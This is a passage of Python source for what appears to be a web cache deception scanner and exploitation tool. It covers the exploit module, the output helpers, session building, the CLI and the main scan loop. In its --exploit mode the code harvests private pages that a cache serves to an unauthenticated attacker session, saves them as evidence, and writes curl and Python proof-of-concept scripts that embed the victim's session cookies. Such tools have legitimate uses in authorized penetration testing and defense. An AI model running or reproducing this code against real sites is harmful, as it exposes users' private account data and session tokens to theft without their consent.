    def _python_poc(self, r: WCDResult) -> str:
        cookies = "; ".join(f"{c.name}={c.value}" for c in self.victim.cookies)
        return self._POC_TEMPLATE.format(
            technique=r.technique,
            original_url=r.original_url,
            payload_url=r.payload_url,
            cookies=cookies,
        )

    def run(self, findings: List[WCDResult], output_dir: str,
            prefix: str) -> List[str]:
        if not findings:
            return []
        out_dir = os.path.join(output_dir, "exploit")
        os.makedirs(out_dir, exist_ok=True)
        artifacts: List[str] = []
        for i, r in enumerate(findings, 1):
            tag = f"{prefix}_finding{i}"
            h = self._harvest(r)

            ev_path = os.path.join(out_dir, f"{tag}_evidence.html")
            with open(ev_path, "w", encoding="utf-8") as f:
                f.write(h.get("body", "") or f"(no body: {h.get('error', '')})")
            artifacts.append(ev_path)

            meta = {k: v for k, v in h.items() if k != "body"}
            meta_path = os.path.join(out_dir, f"{tag}.json")
            with open(meta_path, "w", encoding="utf-8") as f:
                json.dump(meta, f, indent=2, default=str)
            artifacts.append(meta_path)

            curl_path = os.path.join(out_dir, f"{tag}.sh")
            with open(curl_path, "w", encoding="utf-8") as f:
                f.write(self._curl_poc(r))
            os.chmod(curl_path, 0o755)
            artifacts.append(curl_path)

            py_path = os.path.join(out_dir, f"{tag}.py")
            with open(py_path, "w", encoding="utf-8") as f:
                f.write(self._python_poc(r))
            artifacts.append(py_path)

        return artifacts

# ──────────────────────────────────────────────────────────────────────────────
# Output helpers
# ──────────────────────────────────────────────────────────────────────────────

def print_banner() -> None:
    console.print(BANNER)

def print_finding(r: WCDResult) -> None:
    conf_style = {"HIGH": "bold red", "MEDIUM": "bold yellow", "LOW": "yellow"}.get(r.confidence, "white")
    console.print()
    console.rule(f"[{conf_style}] VULNERABLE [{r.confidence}] — {r.technique}[/{conf_style}]")
    console.print(f"  [cyan]Payload URL:[/cyan]  {r.payload_url}")
    console.print(f"  [cyan]Technique:[/cyan]    {r.technique}  |  ext={r.extension}  |  delim={r.delimiter or 'none'}")
    console.print(f"  [cyan]Cache HIT:[/cyan]    {'[green]YES[/green]' if r.cache_hit_confirmed else '[red]NO[/red]'}  "
                  f"| Similarity: {r.content_similarity*100:.1f}%  "
                  f"| Status: {r.http_status_victim}/{r.http_status_attacker}")
    if r.sensitive_findings:
        console.print(f"  [cyan]Sensitive:[/cyan]    ", end="")
        for s in r.sensitive_findings[:4]:
            console.print(f"[bold red]{s.pattern}[/bold red]: {s.value[:80]}  ", end="")
        console.print()
    for note in r.evidence_notes:
        console.print(f"  [dim]  ↳ {note}[/dim]")

def print_summary(session: ScanSession) -> None:
    console.print()
    console.rule("[bold]Scan Complete[/bold]")
    t = Table(box=box.ROUNDED, border_style="dim", show_header=False)
    t.add_column("Key",   style="cyan", no_wrap=True)
    t.add_column("Value", style="bold white")
    t.add_row("Target",         session.target)
    t.add_row("Cache Provider", session.cache_provider)
    t.add_row("URLs Tested",    str(session.urls_tested))
    t.add_row("Payloads Sent",  str(session.payloads_sent))
    vuln_str = str(len(session.vulnerable))
    t.add_row("Vulnerable",     f"[bold red]{vuln_str}[/bold red]" if session.vulnerable else f"[green]{vuln_str}[/green]")
    t.add_row("Scan Time",      session.start_time[:19])
    console.print(t)

    if session.vulnerable:
        console.print()
        vt = Table(title="Confirmed WCD Findings", box=box.ROUNDED,
                   border_style="red", header_style="bold red")
        vt.add_column("#",          width=4)
        vt.add_column("Confidence", width=10)
        vt.add_column("Technique",  width=22)
        vt.add_column("Extension",  width=8)
        vt.add_column("Cache HIT",  width=10)
        vt.add_column("Similarity", width=11)
        vt.add_column("Secrets",    width=8)
        vt.add_column("Payload URL")
        for i, r in enumerate(session.vulnerable, 1):
            conf_style = {"HIGH": "bold red", "MEDIUM": "yellow", "LOW": "dim yellow"}.get(r.confidence, "white")
            vt.add_row(
                str(i),
                f"[{conf_style}]{r.confidence}[/{conf_style}]",
                r.technique,
                r.extension,
                "[green]YES[/green]" if r.cache_hit_confirmed else "[dim]NO[/dim]",
                f"{r.content_similarity*100:.1f}%",
                str(len(r.sensitive_findings)),
                r.payload_url,
            )
        console.print(vt)

# ──────────────────────────────────────────────────────────────────────────────
# Session Builders
# ──────────────────────────────────────────────────────────────────────────────

def build_session(cookies_str: str = "", headers_str: str = "",
                  proxy: str = "", user_agent: str = "") -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": user_agent or (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/126.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    })
    if cookies_str:
        for pair in cookies_str.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                s.cookies.set(k.strip(), v.strip())
    if headers_str:
        for line in headers_str.split("\n"):
            line = line.strip()
            if ":" in line:
                k, v = line.split(":", 1)
                s.headers[k.strip()] = v.strip()
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=__doc__,
        epilog=r"""
Examples:
  Single URL with victim cookies:
    python wcd_hunter.py -u https://target.com/account --cookies "session=abc123"

  URL list + Burp proxy + HTML report:
    python wcd_hunter.py -l urls.txt --cookies "auth=xyz" --proxy http://127.0.0.1:8080 --html

  Quick mode with verbose output:
    python wcd_hunter.py -u https://target.com/profile -c "token=jwt..." --quick --verbose

  High-thread scan with rate limiting:
    python wcd_hunter.py -l urls.txt -c "sid=..." --threads 10 --delay 0.3

  Exploitation (harvest cached private content + write PoC):
    python wcd_hunter.py -u https://target.com/account -c "session=abc" --exploit
""",
    )
    p.add_argument("-u", "--url",       help="Single target URL to test")
    p.add_argument("-l", "--url-list",  help="File containing URLs (one per line)")
    p.add_argument("-c", "--cookies",   help='Victim session cookies: "name=val; name2=val2"', default="")
    p.add_argument("-H", "--headers",   help='Extra headers (newline-separated "Key: Val")', default="")
    p.add_argument("-x", "--proxy",     help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("--attacker-cookies",help="Attacker cookies (default: none / unauthenticated)", default="")
    p.add_argument("--extensions",      help="Comma-separated extensions to test (default: all)", default="")
    p.add_argument("--threads",         type=int, default=5, help="Concurrent threads (default: 5)")
    p.add_argument("--delay",           type=float, default=0.2, help="Seconds between requests (default: 0.2)")
    p.add_argument("--timeout",         type=int, default=15, help="Request timeout in seconds (default: 15)")
    p.add_argument("--quick",           action="store_true", help="Quick mode: fewer extensions (.css .js .png .ico)")
    p.add_argument("--no-ssl-verify",   action="store_true", help="Disable SSL verification")
    p.add_argument("--verbose", "-v",   action="store_true", help="Verbose output")
    p.add_argument("--html",            action="store_true", help="Generate HTML report")
    p.add_argument("--json-out",        action="store_true", help="Generate JSON report")
    p.add_argument("--exploit",         action="store_true", help="Run exploitation module on confirmed findings (harvest cached content + write PoC)")
    p.add_argument("--output-dir",      default="wcd_hunter_output", help="Output directory (default: ./wcd_hunter_output)")
    p.add_argument("--output-prefix",   default="wcd_hunter", help="Output filename prefix")
    return p.parse_args()

def probe_cache_provider(url: str, session: requests.Session,
                         fp: CacheFingerprinter, timeout: int, verify: bool) -> str:
    """Hit the base URL once to fingerprint the cache before scanning."""
    try:
        r = session.get(url, timeout=timeout, verify=verify, allow_redirects=True)
        ci = fp.fingerprint(r)
        return ci.provider
    except Exception:
        return "Unknown"

# ──────────────────────────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────────────────────────

def main() -> None:
    args = parse_args()
    print_banner()

    # ── Collect target URLs ──────────────────────────────────────────────────
    urls: List[str] = []
    if args.url:
        urls.append(args.url.strip())
    if args.url_list:
        try:
            with open(args.url_list, "r", encoding="utf-8") as f:
                urls.extend(line.strip() for line in f if line.strip() and not line.startswith("#"))
        except FileNotFoundError:
            console.print(f"[red][!] URL list not found: {args.url_list}[/red]")
            sys.exit(1)
    if not urls:
        console.print("[red][!] Provide --url or --url-list[/red]")
        sys.exit(1)

    urls = list(dict.fromkeys(urls))  # deduplicate preserving order

    # ── Build sessions ───────────────────────────────────────────────────────
    victim_session   = build_session(args.cookies, args.headers, args.proxy or "")
    attacker_session = build_session(args.attacker_cookies, "", args.proxy or "")

    # ── Generate payloads ────────────────────────────────────────────────────
    ext_list = [e.strip() for e in args.extensions.split(",") if e.strip()] or None
    gen   = PayloadGenerator(extensions=ext_list, quick=args.quick)
    tester = WCDTester(
        victim_session   = victim_session,
        attacker_session = attacker_session,
        timeout  = args.timeout,
        delay    = args.delay,
        verify_ssl = not args.no_ssl_verify,
        verbose  = args.verbose,
    )
    reporter = ReportGenerator()
    fp = CacheFingerprinter()

    # ── Timestamp for output filenames ───────────────────────────────────────
    ts_str   = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir  = args.output_dir
    prefix   = f"{args.output_prefix}_{ts_str}"

    # ── Probe cache fingerprint ───────────────────────────────────────────────
    console.print(f"[dim]→ Probing cache fingerprint on {urls[0]} ...[/dim]")
    cache_provider = probe_cache_provider(urls[0], victim_session, fp, args.timeout, not args.no_ssl_verify)
    console.print(f"[cyan]→ Cache Provider:[/cyan] [bold]{cache_provider}[/bold]")

    # ── Setup scan session ────────────────────────────────────────────────────
    scan = ScanSession(
        target         = urls[0] if len(urls) == 1 else f"{urls[0]} (+{len(urls)-1} more)",
        cache_provider = cache_provider,
    )

    # ── Generate all payloads ─────────────────────────────────────────────────
    all_jobs: List[Tuple[str, "Payload"]] = []
    for url in urls:
        payloads = gen.generate(url)
        all_jobs.extend((url, p) for p in payloads)

    scan.urls_tested   = len(urls)
    scan.payloads_sent = len(all_jobs)

    console.print(f"[cyan]→ Targets:[/cyan]       [bold]{len(urls)}[/bold] URL(s)")
    console.print(f"[cyan]→ Payloads:[/cyan]      [bold]{len(all_jobs)}[/bold] total")
    console.print(f"[cyan]→ Threads:[/cyan]       [bold]{args.threads}[/bold]")
    console.print(f"[cyan]→ Delay:[/cyan]         [bold]{args.delay}s[/bold]")
    console.print()

    # ── Per-URL baselines (authenticated vs anonymous view) ───────────────────
    # Computed once here so the original URL is not re-fetched for every payload,
    # and so each payload's verdict is anchored to a privacy check.
    console.print("[dim]→ Building authenticated vs anonymous baselines ...[/dim]")
    baselines: Dict[str, dict] = {}
    for url in urls:
        bl = tester._baseline(url)
        baselines[url] = bl
        if bl is None:
            console.print(f"[yellow]  [!] baseline failed for {url} — its payloads will be skipped[/yellow]")

    result_lock = threading.Lock()

    def run_job(job: Tuple[str, "Payload"]) -> WCDResult:
        orig_url, payload = job
        result = tester.test_payload(orig_url, payload, baselines.get(orig_url))
        if result.vulnerable:
            with result_lock:
                scan.vulnerable.append(result)
                print_finding(result)
        elif args.verbose:
            console.print(
                f"[dim]  [-] {payload.technique:<22} {payload.extension:<8} "
                f"cache={result.cache_info_attacker.status or 'N/A':<12} "
                f"sim={result.content_similarity*100:.0f}%  "
                f"{payload.url[:70]}[/dim]"
            )
        return result

    # ── Execute with progress bar ─────────────────────────────────────────────
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
        refresh_per_second=8,
    ) as progress:
        task = progress.add_task("[cyan]Scanning...", total=len(all_jobs))
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futures = {pool.submit(run_job, job): job for job in all_jobs}
            for future in as_completed(futures):
                result = future.result()
                with result_lock:
                    scan.all_results.append(result)
                progress.advance(task)

    scan.end_time = datetime.now().isoformat()

    # ── Summary ──────────────────────────────────────────────────────────────
    print_summary(scan)

    # ── Write reports ────────────────────────────────────────────────────────
    os.makedirs(out_dir, exist_ok=True)
    saved: List[str] = []

    if args.json_out or args.html:
        pass  # will write below

    # Always save JSON if any vulns found, or if flag set
    if scan.vulnerable or args.json_out:
        json_path = os.path.join(out_dir, f"{prefix}.json")
        reporter.json_report(scan, json_path)
        saved.append(json_path)

    if args.html:
        html_path = os.path.join(out_dir, f"{prefix}.html")
        reporter.html_report(scan, html_path)
        saved.append(html_path)

    if saved:
        console.print()
        for s in saved:
            console.print(f"[green]✓ Report saved:[/green] {s}")

    # ── Exploitation module ───────────────────────────────────────────────────
    if args.exploit and scan.vulnerable:
        console.print()
        console.rule("[magenta]Exploitation[/magenta]")
        exploit = ExploitModule(
            victim_session=victim_session,
            attacker_session=attacker_session,
            timeout=args.timeout,
            verify=not args.no_ssl_verify,
        )
        for art in exploit.run(scan.vulnerable, out_dir, prefix):
            console.print(f"[magenta]⚡ {art}[/magenta]")
    elif args.exploit:
        console.print("[dim]→ Exploitation skipped: no confirmed findings.[/dim]")

    console.print()
    if scan.vulnerable:
        console.print(
            Panel(
                f"[bold red]{len(scan.vulnerable)} WCD vulnerability(ies) confirmed.[/bold red]\n"
                "Review the findings above. HIGH confidence = cache served private content "
                "to unauthenticated attacker session.",
                title="[bold red]VULNERABLE[/bold red]",
                border_style="red",
            )
        )
    else:
        console.print(
            Panel(
                "[green]No WCD vulnerabilities confirmed with tested payloads.[/green]\n"
                "Consider expanding the URL list, trying authenticated endpoints,\n"
                "or testing with --quick disabled for broader extension coverage.",
                title="[bold green]CLEAN[/bold green]",
                border_style="green",
            )
        )

if __name__ == "__main__":
    main()
